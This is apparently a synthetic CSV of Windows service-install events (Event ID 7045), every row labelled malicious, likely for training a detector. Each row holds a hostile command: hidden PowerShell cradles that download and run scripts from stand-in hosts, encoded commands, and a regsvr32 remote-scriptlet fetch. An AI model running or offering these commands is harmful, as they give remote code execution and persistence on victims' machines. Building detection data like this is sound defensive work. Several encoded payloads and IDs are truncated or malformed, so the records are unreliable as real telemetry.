Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4Kp,2024-08-22T09:15:32.192Z,4f23e9a8-7bdf-49a2-bd53-74123b19cxx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -enc JABzAG... (truncated),Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdfL,2024-07-22T03:45:12.219Z,8a64f4f3-2e51-43a9-b2e1-519f7f6d5x
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,x4KpG,2024-09-01T08:45:12.192Z,43a02da2-95a3-4d23-b67f-1234567890x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIA...,Own Process,Auto Start,LocalSystem,4kJ8a,2024-08-20T08:41:23.192Z,38f957a5-4c2d-49e3-93a1-982gxhrebx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -executionpolicy bypass -windowstyle hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4kLp,2024-08-20T03:45:12.019Z,4f1b9e2f-2daf-4128-9d1a-5c6b7d8ex
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4fJ7a,2024-08-20T08:41:19.219Z,3b87c21f-412d-49b3-8a4c-5d3f8g7hx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\svchost.exe,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KoLp,2024-08-20T10:45:12.219Z,4a79d7d1-e432-4c11-9f5e-2a7b1cd8d8xx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -exec bypass -noni -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4K,2024-09-01T08:47:12.421Z,43ea11d2-5b92-4f3c-85a9-411428bc2f7x
malicious,7045,HiddenService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Auto Start,LocalSystem,a4KpL,2024-08-20T08:41:19.219Z,43f7d151-92b4-4e3a-9a3f-7g64e12cxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -ep bypass -enc aQBlAHgAIAAkAGUAbgB2ADoAegAnAFsAaQBuAHQAcwB0AG8AcwBoAGUAbABsA...,Own Process,Auto Start,LocalSystem,K8DgV,2024-07-22T03:41:19.421Z,4c4f6a3a-2e93-4d64-bf9a-e8c7b7d8a7dax
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -executionpolicy bypass -windowstyle hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,tHkG4d,2024-03-22T09:47:12.219Z,4eca31e5-6dcb-4c11-bf68-2a14adac86ex
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAYwBhAGwAYQBkAGUA,Own Process,Auto Start,LocalSystem,Gx4K,2024-08-20T08:42:11.219Z,2b6f4f5a-1a32-4d19-8e43-23r5t6yx
malicious,7045,UpdateService,%windir%\system32\cmd.exe /c powershell -w hidden -nop -ep bypass iex(new-object net.webclient).downloadstring('http://example.com/malware.ps1'),Own Process,Auto Start,LocalService,aG4K,2024-08-20T10:45:12.219Z,4ec3245a-9b23-4156-92g5rd-123456x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\UpdateService"" /v ImagePath /t REG_SZ /d ""%windir%\system32\svchost.exe -k netsvcs"" /f",Own Process,Auto Start,NT AUTHORITY\LocalService,y87aQ,2024-08-20T08:15:32.109Z,4b23e21c-9c81-4f32-b421-93a4f7aex
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpJ4L,2024-08-22T08:41:19.219Z,4a6321d9-21e8-4f9c-8b2d-7f3c1g6h8x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4SDF,2024-07-22T08:41:19.219Z,4562a1d4-7e93-4211-9f12-3ed4rftgx
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG0A...,Own Process,Auto Start,LocalService,4LpRt,2024-08-20T08:41:22.191Z,2b76b3e4-145c-4f8a-9f1e-fd49bf75cd4x
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c ""powershell -exec bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\Windows\Temp\malware.exe')""",Own Process,Auto Start,LocalService,4GjKp,2024-08-20T08:45:12.219Z,2f51bda4-45f8-43e8-b2b1-1234567890x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG0AbgBkAGUAYwB0AG8AcgBQAFQA,Own Process,Auto Start,LocalSystem,aG4K,2024-03-22T08:41:19.219Z,4f31dca9-21a4-4d83-bc5e-a87f2c0a3ccx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-07-22T10:14:31.219Z,2a34b51d-9ebf-46b3-8df1-9c5848b8ax
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""iex ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdL8,2024-09-01T08:45:21.219Z,2a74e91d-41d5-49bf-b6d8-9f35c79c8ax
malicious,7045,SysUpdateService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAHkALQBuAGUAYQB0AG8AVwByAGUAYQB0AGUAcgA6AGUAYwBjAGgAbQBvAHQAcwBpAHQAbABlAG4AYQBtAGUAcgBuAGUAbAAuAGUAeABpAG4AZQB0AHUAcgBuAGUAbAAuAGMAbwBtAC8AYwBhAHQAYwBoAHQAYgBQAHIAbwBmAHQALQBuAGUAYQB0AG8AVwByAGUAYQB0AGUAcgA6AGUAYwBjAGgAbQBvAHQAcwBpAHQAbABlAG4AYQBtAGUAcgBuAGUAbAAuAGUAeABpAG4AZQB0AHUAcgBuAGU,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4S6fT,2022-11-03T07:44:21.213Z,2b4f5a85-1e61-4a23-95a2-5c7a4f2cxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQByAGUAbgBkAGUAYwBhAHMAZQByAHYAZQBy,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-03-22T10:45:12.219Z,4e3d9f6a-1a4e-4b9f-a8e1-9f6a1a4ex
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aJ4Kp,2024-03-22T08:45:12.192Z,45e213c1-2f71-4d25-85a2-ec7f6c3dx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAcgB2AGUAcgB0AGkAYwBvAG4AdAA...,Own Process,Auto Start,LocalSystem,43LpN,2024-08-21T09:45:12.219Z,2c98765a-1234-4567-89ab-cdef12345678x
malicious,7045,SuspiciousUpdate,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGMAcgBvAHMAbwBmAHQALgBzAHkAcwB0AGUAYwB0AC4AQQB1AHQAbwBtAGEAdAB1AGQALgBOAGEAbQBlAG4AdABpAG8AbgAuAGMAbwBtAHAAbABpAG4AYQBtAGUAcwB0AC4AQQB1AHQAbwBtAGEAdAB1AGQALgBQAGEAYgBzAHQAbwBtAGEAdABlAGQALgBXAGUAYgBQAHIAbwB4AHkA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,G4Kp,2024-02-20T08:42:11.219Z,43a211d5-5b83-4f42-9d8d-92f1a6cxx
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwBhAGQAZQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpG4D,2024-03-29T03:44:19.123Z,4f312bcd-9e6d-4f8a-85f3-145g67h8cx
malicious,7045,SuspiciousSvc,"cmd.exe /c ""C:\Windows\System32\powershell.exe"" -nop -w h -c ""IEX (New-Object Net.WebClient).DownloadString('http://pastebin.com raw/xKq6zHBG')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4AaZ,2024-08-20T08:14:22.189Z,4f6a3d1e-2198-4321-9df2-1a2c3d4e5f6x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden -nop ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpQaB,2024-07-22T03:45:12.192Z,3b537cd4-2198-4123-ba4c-12876543cxx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAGUAcgBpAG4AaQBzAHQAcgBdADoAOgBcAHcAaQBzAHQAcgBdADoAQwBhAHQAYQBuAGMAaAA=,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdL8,2024-08-20T08:41:22.192Z,62a1f9c5-4b21-4982-ba12-9f8asdwex
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGMA...,Own Process,Auto Start,LocalService,pGK4d,2024-09-01T08:45:12.219Z,3fbaa4e1-4a31-45e6-bf92-3a2d1c253x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-03-22T08:41:19.219Z,43a21f3c-8e43-4192-ba98-fg5tre23x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\Documents\script.ps1""",Own Process,Auto Start,LocalSystem,4J8Gp,2024-08-20T08:42:19.219Z,4a6c5a2d-3f8a-4e92-b7c1-23f4da9b8x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABjAGwAaQBlAG4AdAA...,Own Process,Auto Start,LocalSystem,Kq4z,2024-08-20T08:42:19.219Z,4f6a9e3b-2198-4c1a-bf4e-85t6gfrex
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c ""powershell -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\Windows\Temp\update.exe')""",Own Process,Auto Start,LocalSystem,GpL4K,2024-07-22T03:45:12.219Z,43a72c9d-2194-42b7-b122-8a4f6c9e2x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,Gx4lK,2024-07-22T08:41:19.421Z,3b6c7a4f-2e41-49b3-9efc-8b2a5d3f1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdT9L,2024-09-01T07:45:12.192Z,23a7cd4f-8e43-4962-93f7-1234567890x
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""iwr -uri http://example.com/malware.exe -outfile C:\Windows\Temp\update.exe""",Own Process,Auto Start,LocalSystem,4KpL8,2024-08-20T10:14:22.192Z,26a7f431-4c9a-49f2-bd7c-92a4f6g7h8i9x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4dK3L8,2024-08-22T08:45:12.219Z,43a9f7d2-511e-49d8-8c18-df7b23e1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,GxK4p,2024-09-02T08:41:19.192Z,43b92c98-2a15-4c51-bf4a-8dab1f0d4569x
malicious,7045,StealthService,"%windir%\System32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,a5H4R,2024-02-20T08:41:18.219Z,82734a85-219d-4e3a-b5a8-809f1e1234x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -command ""iex ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Demand Start,LocalService,4KtR9,2024-09-02T08:41:23.421Z,3f456d8a-121c-4c12-85f1-a8d9b6f7g6hx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAYQB0AF8A...,Own Process,Auto Start,LocalService,4SDFg,2024-03-22T08:41:19.219Z,45a832f5-bc25-49f3-bd41-e2c7b2a21d15x
malicious,7045,MskService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Demand Start,LocalService,uJ4Kp,2024-07-22T03:45:12.192Z,23a94f65-4e71-4125-9cfa-2e1f5c8a2b4x
malicious,7045,SvcHostUpdater,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -Exec Bypass ...,Own Process,Auto Start,LocalSystem,GxKdL9,2024-03-10T08:41:19.219Z,3f18a293-4c11-4d5f-ae23-872fac87xx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -ep bypass -nop -c Start-Process -FilePath 'C:\Windows\Temp\suspicious.exe'""",Own Process,Auto Start,LocalSystem,4SdLk,2024-08-20T08:45:12.219Z,4d7c57e2-9b43-4121-a5df-5b0f4axxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ENC ...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KtGpL,2024-08-20T08:42:19.123Z,23f413d5-9c85-42a1-8e93-23456789x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgB0AG8AbQBhAGkAbgB0AHMAcwA7ACQAYwBvAG0AbQBhAG4AZAAgAHUAcwBpAG4AZQB0AHMALgBSAGUAYQBkAGUAcgB0AHMAKAApAH0A,Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4dLp,2024-08-20T06:45:12.219Z,4f684321-ba43-425a-bf8f-9d2518f4a1cx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAcgB2AGUAcgB0AGkAYQBsAF8AcgBpAGQAZQByACgAKQAuAGQAbwB3AG4AbABvAGEAZABTAGEAcgBpAHYAZQByACkAKQAuAGQAbwB3AG4AbABvAGEAZABTAGEAcgBpAHYAZQByACkAOwA=,Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx4K7d,2024-07-22T03:14:22.219Z,4c21a6f2-85d3-4123-af92-1e8d4f5gx
malicious,7045,SuspiciousUpdate,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAbgBkAGUAcgBvAGUAbQBkACgAKQApACgAUABvAHQAbQBwAGUAcgBhAHQAZQAtAHQAcgBhAHQAaQBvAG4AZQB4ACgAWwBzAHQAcgBhAGMAaABlAHQAdQBmAGwAbwB3ACcALQBlAHgAZQBjAHQAaQB2AGUAYwB0AGUAZABlAGMAcgB5ACgAWwBzAHQAcgBhAGMAaABlAHQAdQBmAGwAbwB3ACcALQBlAHgAZQBjAHQAaQB2AGUAYwB0AGUAZABlAGMAcgB5AH0A,Own Process,Demand Start,LocalSystem,4xK8D,2024-09-01T08:45:12.219Z,23eac512-45f8-4d21-bb91-5a378f458f3x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\update.ps1""",Own Process,Auto Start,LocalSystem,4KpL8,2024-09-02T08:45:12.219Z,7a21d41c-9f6c-4e32-9a85-4c1a8a6e5x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c start /b /min powershell -nop -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4pGKq,2024-09-01T08:45:12.219Z,45e89f4a-21df-4c38-b6d1-8e6f3cbb8c5x
malicious,7045,SuspiciousService,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,pN4kG,2024-08-20T09:41:22.191Z,8f635bcd-4211-49a8-b512-34asdwefx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell.exe -enc JABlAG4AdgBpAGQAYQBuAGMAaAA=,Own Process,Auto Start,LocalSystem,r4dZ,2024-07-22T10:11:21.219Z,3fba45e6-cd21-478f-bc1e-2f1e4147a8fx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdL,2024-07-22T08:41:22.511Z,63529d5e-2b43-49f1-b125-82b415aax
malicious,7045,MalService32,%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\update.ps1,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4LpR8,2024-03-22T07:14:22.192Z,4f81a6c2-2b51-49d5-8e4f-1a2b3c4d5ex
malicious,7045,HarmfulService,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Share Process,Demand Start,NT AUTHORITY\SYSTEM,t3Rz,2024-09-,3c8ef511-25f4-49f2-b83a-45a11476b3dx
malicious,7045,CmdSvc,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAdABoAGUAcgBvAGkAbgBnAC...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,aBcD3,2024-08-20T10:15:32.219Z,4c5a3f6d-9421-4f5b-bc6e-7a31c6bax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAdAAtAFcAaQBuAGQAbwB3AHMAcABvAHcAZQByAHMAaABvAGYAbQBhAHQAZQAgAC0AYgB1AG4AYQBnAGUAZAA9ACIA,Own Process,Auto Start,NT AUTHORITY\SYSTEM,G3KjR4,2024-09-02T10:45:21.512Z,4a2b1c7d-91a3-4b5c-8f1e-7da9a4c7bx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAG4AdgBpAHMI...,Own Process,Auto Start,LocalService,f4Kp,2024-03-22T08:45:12.219Z,4c221bd2-85e3-4a95-9e3f-1234567890x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,f4kEa,2024-08-20T08:42:11.219Z,4f5e2319-9da5-4271-bd2c-1234567890x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAHgAdAAuAHQAaABlAHMAaABvAG4AIAAxAC4AMQA5AC4AQwA5AC4ARABhAHQAYQBiAGwAZQAiAC4ASQBuAHQAcwBlAHIAcwBvAHUAbABlAHMAcwBvAHIAaQBnAG4AdAAuAHQAeABlAGMAbQBpAG4AaQBzAHQAaQBhAHIAawBzAC4AZQB4AGMAaABpAG4AaQBzAHQAaQBhAHIAawBzAC4ASQBuAHQAcwBlAHIAcwBpAG4AZQA=,Own Process,Auto Start,LocalSystem,kJ4xGp,2024-08-20T08:41:12.192Z,4f61185a-23f4-43a2-98c5-ba9f7c5cxx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/script.ps1')""",Own Process,Auto Start,NT AUTHORITY\LocalService,4SdTgR,2024-02-22T07:41:19.192Z,43b6f5b7-9f4a-4128-9e3f-12d6a6c3x
malicious,7045,SYSUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.100/payload')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,xk4aL8,2024-08-20T08:45:12.219Z,4a62b93c-11ec-4f5d-bf5e-7a4a2d9b8c9x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBwAHIAbwB2AGUAcgBzAGgAzAD0A,Own Process,Auto Start,LocalService,aG4Kp,2024-09-22T21:45:12.187Z,4c7d2e3f-825b-49c3-b123-4wertyuiopx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4Dp,2024-03-10T08:45:21.012Z,2f1f9a9c-4a83-4f2e-9b4a-e1d8b9a8c9dax
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""iwr http://example.com/malware.exe -o $env:temp\malware.exe; start $env:temp\malware.exe""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aGpL4,2024-07-22T10:41:23.219Z,38765492-2198-4123-8234-92a1e56bx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4S78aD,2024-03-22T03:45:12.219Z,8a21c9d2-45f8-4121-bc34-6a5b9821cxx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -noni -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT Authority\LocalService,4KpRaN,2024-08-20T08:41:22.192Z,4ecb4e8f-511c-49f0-8a95-2a42f7a38c9x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,t4K3r,2024-08-20T10:45:12.219Z,2a31f444-9e53-4b82-b41f-93a59a6ax
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JAB...,Own Process,Demand Start,LocalSystem,aG5fB,2024-09-01T08:45:21.219Z,42cfd4a2-1f3c-4d2c-ba4f-1f6c9e8x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JAAoACgAIAAkAGIARA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sD9k,2024-03-22T10:45:12.191Z,a2e4f561-23b9-4e81-9c34-8b4f1g6h7x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAG4AdAApAC4AVwBpAG4AZABvAHcAcwApAC4AVwBpAG4AZABvAHcAcwAuAGUAeABlAC4AYQBtAGUAdABlAC4AYQBtAGUAcgAp,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4RdJ9,2024-09-02T08:41:19.219Z,8f65b123-4567-89ab-cdef-12345678x
malicious,7045,HiddenUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABhAHMAaQBjAGgA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SfD,2024-08-19T10:14:21.219Z,48529371-231c-4b81-b4d2-3e5f74a8x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -nop IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Demand Start,LocalSystem,4SdT7,2024-03-22T08:41:01.219Z,4a2198f6-357c-4d85-8b43-a1d0c7b6e26x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,kJs8H,2024-08-22T08:41:19.217Z,3b4a51d7-8261-4e32-ba92-7e6fghjkx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""iex ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4kGxRt,2024-09-01T08:42:19.421Z,8f67b4f3-4d12-4153-8b6d-5e92a5e8x
malicious,7045,KernelUpdater,"%windir%\system32\cmd.exe /c powershell -exec bypass -window hidden ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4sRtNh,2024-08-20T08:41:19.219Z,4f6b8a3d-4219-49c5-ba1a-23456a7bc8d3x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c regsvr32 /s /u /i:http://example.com/malware.sct scrobj.dll,Own Process,Auto Start,LocalService,4KpL,2024-08-22T08:45:12.192Z,2a74f511-9e4c-42d1-8a4d-3d9b6a4e1cxx
malicious,7045,SystemUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -encodedcommand JABzAD0AJwB1AHcAcABhAHIAbwB1AHIA...,Own Process,Auto Start,LocalService,4KoZ,2024-08-20T08:41:22.192Z,45a8d2b1-6e71-4321-9asr12-3asdvbx
